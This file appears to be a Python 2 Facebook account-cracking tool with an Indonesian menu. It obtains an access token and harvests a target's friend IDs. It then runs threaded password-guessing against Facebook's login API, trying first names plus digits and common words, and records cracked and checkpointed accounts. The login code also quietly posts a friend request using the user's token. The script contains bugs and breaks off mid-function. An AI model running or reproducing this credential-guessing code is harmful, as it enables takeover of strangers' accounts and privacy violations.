#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(1000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nomor.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'SELAMAT TINGGAL'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Do_Dhe_Les
##### LOGO #####
logo = """
\033[1;97m ┳┻┳┻▇▇▇▇▇▇┏━━━┓┏┓━━━┏━━━┓┏━━━┓┏━━━┓▇▇▇▇▇▇┳┻┳┻┳┻
\033[1;97m ┻┳┻┳▇▇▇▇▇▇┃┏━┓┃┃┃━━━┃┏━┓┃┗┓┏┓┃┃┏━┓┃▇▇▇▇▇▇┻┳┻┳┻┳
\033[1;97m ┳┻┳┻▇▇▇▇▇▇┃┗━━┓┃┃━━━┃┃━┃┃━┃┃┃┃┃┃━┃┃▇▇▇▇▇▇┳┻┳┻┳┻
\033[1;97m ┻┳┻┳▇▇▇▇▇▇┗━━┓┃┃┃━┏┓┃┃━┃┃━┃┃┃┃┃┃━┃┃▇▇▇▇▇▇┻┳┻┳┻┳
\033[1;97m ┳┻┳┻▇▇▇▇▇▇┃┗━┛┃┃┗━┛┃┃┗━┛┃┏┛┗┛┃┃┗━┛┃▇▇▇▇▇▇┻┳┻┳┻┳
\033[1;97m ┻┳┻┳▇▇▇▇▇▇┗━━━┛┗━━━┛┗━━━┛┗━━━┛┗━━━┛▇▇▇▇▇▇┳┻┳┻┳┻
\033[1;97m ┳┻┳┻▇▇▇▇▇▇━━━━━━━━━━━━━━━━━━━━━━━━━▇▇▇▇▇▇┻┳┻┳┻┳
\033[1;97m ┻┳┻┳▇▇▇▇▇▇━━━━━━━━━━━━━━━━━━━━━━━━━▇▇▇▇▇▇┳┻┳┻┳┻
\033[1;97m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""


def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;97mTunggu Sebentar \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;97m ┳┻┳┻▇▇▇▇▇▇┏━━━┓┏┓━━━┏━━━┓┏━━━┓┏━━━┓▇▇▇▇▇▇┳┻┳┻┳┻
\033[1;97m ┻┳┻┳▇▇▇▇▇▇┃┏━┓┃┃┃━━━┃┏━┓┃┗┓┏┓┃┃┏━┓┃▇▇▇▇▇▇┻┳┻┳┻┳
\033[1;97m ┳┻┳┻▇▇▇▇▇▇┃┗━━┓┃┃━━━┃┃━┃┃━┃┃┃┃┃┃━┃┃▇▇▇▇▇▇┳┻┳┻┳┻
\033[1;97m ┻┳┻┳▇▇▇▇▇▇┗━━┓┃┃┃━┏┓┃┃━┃┃━┃┃┃┃┃┃━┃┃▇▇▇▇▇▇┻┳┻┳┻┳
\033[1;97m ┳┻┳┻▇▇▇▇▇▇┃┗━┛┃┃┗━┛┃┃┗━┛┃┏┛┗┛┃┃┗━┛┃▇▇▇▇▇▇┻┳┻┳┻┳
\033[1;97m ┻┳┻┳▇▇▇▇▇▇┗━━━┛┗━━━┛┗━━━┛┗━━━┛┗━━━┛▇▇▇▇▇▇┳┻┳┻┳┻
\033[1;97m ┳┻┳┻▇▇▇▇▇▇━━━━━━━━━━━━━━━━━━━━━━━━━▇▇▇▇▇▇┻┳┻┳┻┳
\033[1;97m ┻┳┻┳▇▇▇▇▇▇━━━━━━━━━━━━━━━━━━━━━━━━━▇▇▇▇▇▇┳┻┳┻┳┻
\033[1;97m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
UsernameBenar = "aldo"
PasswordBenar = "slodo"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m»»Tool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == UsernameBenar):
    	password = raw_input("\033[1;97m»»Tool Password \x1b[1;97m»» \x1b[1;97m")
        if (password == PasswordBenar):
            print "Berhasil Masuk Ke " + username #Do_Dhe_Les
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mPassword Salah"
            os.system('xdg-open https://wa.me/+6285746145006')
    else:
        print "\033[1;91mUsername Salah"
        os.system('xdg-open https://wa.me/+6285746145006')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
        print "\033[1;97m»»1. Tools Baru  "
        time.sleep(0.05)
	print "\033[1;97m»»2. Login  Facebook  "
        time.sleep(0.05)
        print "\033[1;97m»»3. Login  Dengan Token"
        time.sleep(0.05)
        print "\033[1;97m»»4. Access Token Fb"
        time.sleep(0.05)
        print "\033[1;97m»»5. Save   "
        time.sleep(0.05)
        print "\033[1;97m»»6. Subs   "
        time.sleep(0.05)
	print "\033[1;91m»»0. Keluar             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;97mPilih Tools>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih Yang Benar"
		pilih_login()
        elif peak =="1":
		blackmafiax()
	elif peak =="2":
		login1()
        elif peak =="3":
	        tokenz()
        elif peak =="4":
	        os.system('xdg-open http://localhost:5000/')
	        login()
        elif peak =="5":
		os.system('xdg-open https://wa.me/+6285746145006')
	        login()
        elif peak =="6":
	        os.system('xdg-open https://www.youtube.com/channel/UC52IDigVVCqPHtC_4kd8gng')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91mPilih Yang Benar"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		print('	' )
		id = raw_input('\033[1;97m»»Facebook/Email: \x1b[1;97m')
		pwd = raw_input('\033[1;97m»»Password      : \x1b[1;97m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;91mTidak ada koneksi internet"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;92mLogin Berhasil'
				os.system('xdg-open https://www.youtube.com/channel/UC52IDigVVCqPHtC_4kd8gng')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mTidak ada Koneksi internet"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;91mAkun Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;91mPassword/Email Salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mAkun Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mTidak ada Koneksi internet"
		keluar()
	os.system("clear") #Do_Dhe_Les
        time.sleep(0.05)
	print logo
	print "\033[1;97m              Info Login User"
        time.sleep(0.05)
	print "	   \033[1;97m           "+nama+"\033[1;92m               "
        time.sleep(0.05)
	print "	   \033[1;97m           "+id+"\x1b[1;92m              "
        time.sleep(0.05)
	print "\033[1;97m»»1. Crack Facebook     "
        time.sleep(0.05)
        print "\033[1;97m»»2. Target Facebook        "
        time.sleep(0.05)
        print "\033[1;97m»»3. Report Facebook      "
        time.sleep(0.05)
        print "\033[1;97m»»4. informasi Teman      "
        time.sleep(0.05)
        print "\033[1;97m»»5. Mengatasi ID Not Found  "
        time.sleep(0.05)
        print "\033[1;97m»»6. Group FB  "
        time.sleep(0.05)
        print "\033[1;97»»7. WhatsApp Gue   "
        time.sleep(0.05)
        print "\033[1;97m»»8. Youtube Gue   "
        time.sleep(0.05)
        print "\033[1;97m»»9. Login Dengan Token          "
        time.sleep(0.05)
        print "\033[1;97m»»10. Cek Token login/ID       "
        time.sleep(0.05)
        print "\033[1;97m»»11. Tools Reset & Update         "
        time.sleep(0.05)
	print "\033[1;91m»»0. Keluar                        "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mPilih Menu>>> \033[1;93m")
	if unikers =="":
		print "\x1b[1;97mPilih Yang Benar"
		pilih()
	elif unikers =="1":
		crack()
        elif unikers =="2":
		os.system('clear')
		print logo
		brute()
        elif unikers =="3":
		fighter()
        elif unikers =="4":
		asif()
        elif unikers =="5":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
        elif unikers =="6":
		os.system('xdg-open https://https://www.facebook.com/groups/1464309477131285/?ref=share')
		menu()
        elif unikers =="7":
		os.system('xdg-open https://wa.me/+6285746145006')
	        menu()
        elif unikers =="8":
	        os.system('xdg-open https://www.youtube.com/channel/UC52IDigVVCqPHtC_4kd8gng')
	        menu()
        elif unikers =="9":
		tokenz()
        elif unikers =="10":
		os.system('reset')
		print logo
		toket=open('login.txt','r').read()
		print "\033[1;97m»»Token Anda\033[1;97m :\033[1;92m "+toket
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		menu()
	elif unikers =="11":
		os.system('clear')
		print logo
		print "\033[1;97mDataReset"
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91m Data Reset')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Dihapus')
                print logo
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mPilih Yang Benar"
		pilih()

def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97»»1. Crack FB Indonesia       "
        time.sleep(0.05)
        print "\033[1;97m»»2. Crack FB Bangladesh          "
        time.sleep(0.05)
        print "\033[1;97m»»3. Crack FB Bule      "
        time.sleep(0.05)
        print "\033[1;97m»»4. Crack FB India   "
        time.sleep(0.05)
        print "\033[1;97m»»5. Crack FB Pakistan     "
        time.sleep(0.05)
        print "\033[1;97m»»6. Crack FB Malaysia    "
        time.sleep(0.05)
        print "\033[1;97m»»7. Crack FB Indonesia v2     "
        time.sleep(0.05)
        print "\033[1;97m»»8. Crack FB Thailand   "
        time.sleep(0.05)
        print "\033[1;97m»»9. Crack FB Philipines     "
        time.sleep(0.05)
        print "\033[1;97m»»10. Crack FB Malaysia v2        "
        time.sleep(0.05)
        print "\033[1;97m»»11. Crack FB Group (error)"
        time.sleep(0.05)
	print "\033[1;91m»»0. Kembali"
	pilih_crack()

def pilih_crack():
	peak = raw_input("\n\033[1;97mPilih Tools>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih yang benar"
		pilih_crack()
	elif peak =="1":
		os.system('clear')
		print logo
		jjt = raw_input("\033[1;97m»»Masukan ID: \033[1;92m")
		try:
			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
			td = json.loads(m.text)
			print"\033[1;97mNama:\033[1;92m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Salah!"
			raw_input("\n\033[1;91m[\033[1;97mKembali\033[1;91m]")
			crack()
		print"\033[1;97mMencari ID\033[1;97m..."
		n = requests.get("https://graph.facebook.com/"+jjt+"/friends?access_token="+toket)
		d = json.loads(n.text)
		for c in d['data']:
			id.append(c['id'])
        elif peak =="2":
	        super()
        elif peak =="3":
	        hack()
        elif peak =="4":
	        black()
        elif peak =="5":
	        mafia()
        elif peak =="6":
	        test()
        elif peak =="7":
	        phone()
        elif peak =="8":
	        mail()
        elif peak =="9":
	        isi()
        elif peak =="10":
	        army()
        elif peak =="11":
                clone_dari_member_group ()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mPilih Yang Benar"
		pilih_crack()
	
	print "\033[1;97m»» Total ID : \033[1;92m"+str(len(id))
	jalan('\033[1;97m»» mStart Crack Indonesia...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m»»Crack \033[1;91m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;91m»»Stop CTRL+z')
	print 42*"\033[1;97m="
	
			
	def main(arg):
		global cekpoint,sucessful
		user = arg
		try:
			os.mkdir('cookie')
		except OSError:
			pass #Do_Dhe_Les
		try:
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = y['first_name']+'12'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92m[✓] ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;93m[+] ' + user + ' | ' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = y['first_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92m[✓] ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;93m[+] ' + user + ' | ' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92m[✓] ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;93m[+] ' + user + ' | ' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92m[✓] ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;93m[+] ' + user + ' | ' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'sayang'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92m[✓] ' + user + ' | ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;93m[+] ' + user + ' | ' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'bismillah'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92m[✓] ' + user + ' | ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;93m[+] ' + user + ' | ' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'indonesia'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92m[✓] ' + user + ' | ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;93m[+] ' + user + ' | ' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;92m✓Selesai....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	raw_input("\n\033[1;97m[\033[1;91mKembali\033[1;97m]")
	crack()
        
def hack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m»»1.Crack Publik ID."
        time.sleep(0.05)
	print "\033[1;91m»»0.Kembali"
	pilih_hack()

def pilih_hack():
	peak = raw_input("\n\033[1;97mPilih Tools>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih yang benar"
		pilih_hack()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m»»Masukan ID\033[1;97m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mNama:\033[1;92m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Salah!"
			raw_input("\n\033[1;91m[\033[1;97mKembali\033[1;91m]")
			hack()
		print"\033[1;97mMencari ID\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mPilih Yang Benar"
		pilih_hack()
	
	print "\033[1;97m»» Total ID : \033[1;92m"+str(len(id))
	jalan('\033[1;97m»» mStart Crack Bule...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m»»Crack \033[1;91m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;91m»»Stop CTRL+z')
	print 42*"\033[1;97m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Do_Dhe_Les
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = '123456789'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[✓] ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;93m[+] ' + user + ' | ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[✓] ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;93m[+] ' + user + ' | ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[✓] ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;93m[+] ' + user + ' | ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[✓] ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;93m[+] ' + user + ' | ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '123456'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[✓] ' + user + ' | ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;93m[+] ' + user + ' | ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = '1234567'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[✓] ' + user + ' | ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;93m[+] ' + user + ' | ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = '12345678'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[✓] ' + user + ' | ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;93m[+] ' + user + ' | ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)		
											                                       
																	
															
		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;92m✓Selesai....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	raw_input("\n\033[1;97m[\033[1;91mKembali\033[1;97m]")
	crack()

def black():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m»»1.Crack Publik ID."
        time.sleep(0.05)
	print "\033[1;91m»»0.Kembali"
	pilih_black()

def pilih_black():
	peak = raw_input("\n\033[1;97mPilih Tools>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih yang benar"
		pilih_black()
	elif peak =="1":
		os.system('clear')
		print logo
